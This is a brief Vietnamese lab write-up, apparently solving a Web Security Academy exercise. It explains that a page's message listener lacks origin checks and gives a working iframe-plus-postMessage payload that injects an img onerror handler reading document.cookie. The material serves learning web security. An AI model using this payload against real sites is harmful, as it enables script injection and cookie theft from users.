Yêu cầu: Vào exploit server gửi script để chạy hàm print()
Ở source của homepage có 1 script chứa hàm addEventListener() có input là 1 message hoặc 1 hàm
![image](https://user-images.githubusercontent.com/62832067/150753527-546e8a62-cc18-4760-bc76-ce01c0e61eeb.png)
<br>Vì thế rất dễ để ta truyền payload vào đó thông qua **postMessage()** do không có bất kì xác thực thông báo nào
<br> Ta sử dụng thẻ iframe cùng với hàm postMessage: <iframe src="https://acf11fc01ecdea93c0274e6e0045008b.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">
![image](https://user-images.githubusercontent.com/62832067/150759980-69d42d6e-4730-4e5f-80c2-1f2aa0ba2723.png)
